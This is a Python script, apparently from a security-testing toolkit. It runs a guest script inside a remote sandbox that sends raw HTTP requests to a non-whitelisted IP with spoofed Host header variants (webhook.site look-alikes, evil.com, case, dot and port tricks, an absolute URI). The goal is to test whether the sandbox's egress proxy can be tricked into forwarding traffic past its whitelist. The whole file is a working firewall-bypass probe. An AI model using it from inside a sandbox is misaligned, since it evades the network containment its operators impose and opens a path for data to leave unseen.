# -*- coding: utf-8 -*-
"""Phase18: 明文 HTTP Host 头解析 - 代理是否按 Host 转发 + 边界变体"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_ABb1jCnj63zggiYyaB6t9Hlriiod"  # fwtest8, custom webhook.site

GUEST = r'''
import socket, time

def http_send(ip, port, req, label='', wait=6):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(wait)
        t0 = time.time()
        s.connect((ip, port))
        s.sendall(req)
        try:
            r = s.recv(600)
            print('[%s %s:%d] resp(%.1fs): %r' % (label, ip, port, time.time()-t0, r[:120]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT(%.1fs)' % (label, ip, port, time.time()-t0), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s: %s' % (label, ip, port, type(e).__name__, e), flush=True)

# 非白名单 IP(httpbin)80 端口, Host 头变体
for host, label in [
    ('webhook.site', 'h-wh'),
    ('webhook.site.evil.com', 'h-wh-suffix'),
    ('evilwebhook.site', 'h-wh-prefix'),
    ('webhook.site.', 'h-wh-dot'),
    ('WebHook.Site', 'h-wh-case'),
    ('webhook.site:443', 'h-wh-port'),
    ('webhook.site:80', 'h-wh-port80'),
    ('webhook.site.evil', 'h-wh-part'),
]:
    req = ('GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' % host).encode()
    http_send('34.195.135.204', 80, req, label)

# 绝对 URI
http_send('34.195.135.204', 80,
          b'GET http://webhook.site/ HTTP/1.1\r\nHost: evil.com\r\nConnection: close\r\n\r\n',
          'h-abs-uri')
# 对照: 白名单 IP + 白名单 Host (期望通)
http_send('178.63.67.153', 80,
          b'GET / HTTP/1.1\r\nHost: webhook.site\r\nConnection: close\r\n\r\n',
          'ctrl-wh')
print('done', flush=True)
'''

code = "cat > /tmp/pg25.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg25.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:5000], flush=True)
